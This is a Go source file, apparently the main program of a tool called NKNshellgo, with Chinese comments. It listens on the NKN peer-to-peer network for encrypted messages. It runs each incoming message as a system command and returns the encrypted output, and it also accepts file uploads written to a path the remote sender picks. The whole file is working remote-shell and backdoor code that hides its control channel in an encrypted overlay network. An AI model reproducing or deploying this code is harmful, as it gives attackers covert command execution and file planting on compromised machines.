package main

import (
	"NKNshellgo/config"
	"NKNshellgo/module/cipher"
	"NKNshellgo/module/command"
	"NKNshellgo/module/fileSender"
	"NKNshellgo/module/stringReplace"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/liudng/godump"
	nkn "github.com/nknorg/nkn-sdk-go"
	"log"
)

var serverConf *nkn.ClientConfig

func setConfig() {
	serverConf = &nkn.ClientConfig{
		SeedRPCServerAddr:       nil,
		RPCTimeout:              100000,
		RPCConcurrency:          5,
		MsgChanLen:              4096,
		ConnectRetries:          10,
		MsgCacheExpiration:      300000,
		MsgCacheCleanupInterval: 60000,
		WsHandshakeTimeout:      100000,
		WsWriteTimeout:          100000,
		MinReconnectInterval:    100,
		MaxReconnectInterval:    10000,
		MessageConfig:           nil,
		SessionConfig:           nil,
	}
}

func main() {
	setConfig()
	//创建一个接收方id
	//判断是否指定新的seed
	var newSeed string
	var encrypteType string
	flag.StringVar(&newSeed, "n", "default", "newSeed")
	flag.StringVar(&encrypteType, "e", "default", "encrypt")
	flag.Parse()
	//如果是default就使用默认的seed，否则使用新的seed
	if newSeed == "default" {
		newSeed = config.SeedId
	}
	//加载种子和账号
	seed, _ := hex.DecodeString(newSeed)
	account, _ := nkn.NewAccount(seed)
	//创建一个接收方客户端，并且获取客户端地址
	server, _ := nkn.NewMultiClient(account, hex.EncodeToString([]byte(config.ShellID)), 4, false, serverConf)
	defer func(toClient *nkn.MultiClient) {
		_ = toClient.Close()
	}(server)
	fmt.Println(server.Address())
	//加入通道
	<-server.OnConnect.C
	godump.Dump(server.OnConnect.C)

	//定义接收时间和接收方接收消息
	//var flags string = ""
Reveive:
	msg := <-server.OnMessage.C
	godump.Dump(server.OnMessage.C)
	//如果内容一样就跳回到接收处
	//if string(msg.Data) == flags {
	//	goto Reveive
	//}
	//flags = string(msg.Data)
	//解密已经加密的数据
	cipherText, _ := hex.DecodeString(string(msg.Data))
	message := cipher.CipherDecode(cipherText, encrypteType)
	//如果client发送文件传送指令，就开始接收文件
	message = stringReplace.RemoveEnd(message)
	godump.Dump(message)
	//如果是文件接收就开始接收
	if message == "fileSend" {
		encryptedResult := hex.EncodeToString(cipher.CipherEncode("savePath", encrypteType))
		_ = msg.Reply(encryptedResult)
		chunks := make([]byte, 0)
		//接收savePath
		msg := <-server.OnMessage.C
		savePathbyte, _ := hex.DecodeString(string(msg.Data))
		savePath := cipher.CipherDecode(savePathbyte, encrypteType)
		savePath = stringReplace.RemoveEnd(savePath)
		encryptedResult = hex.EncodeToString(cipher.CipherEncode("ok", encrypteType))
		_ = msg.Reply(encryptedResult)
	ReceiveFile:
		//接收文件和指令
		msg = <-server.OnMessage.C
		processCipher, _ := hex.DecodeString(string(msg.Data))
		processPlain := cipher.CipherDecode(processCipher, encrypteType)
		//如果client发出发送完毕指令，shell就保存文件
		if processPlain == "finish" {
			encryptedResult = hex.EncodeToString(cipher.CipherEncode("over", encrypteType))
			fileSender.ReceiveFile(savePath, chunks)
			_ = msg.Reply(encryptedResult)
		} else { //没有接收完毕前持续接收
			chunks = append(chunks, []byte(processPlain)...)
			encryptedResult := hex.EncodeToString(cipher.CipherEncode("continue", encrypteType))
			_ = msg.Reply(encryptedResult)
			goto ReceiveFile
		}
	} else { //否则就命令执行
		log.Print(message)
		result := command.ExecCommand(message)
		//fmt.Println(result)
		//加密命令执行结果并返回
		encryptedResult := hex.EncodeToString(cipher.CipherEncode(result, encrypteType))
		_ = msg.Reply(encryptedResult)
	}
	goto Reveive
}
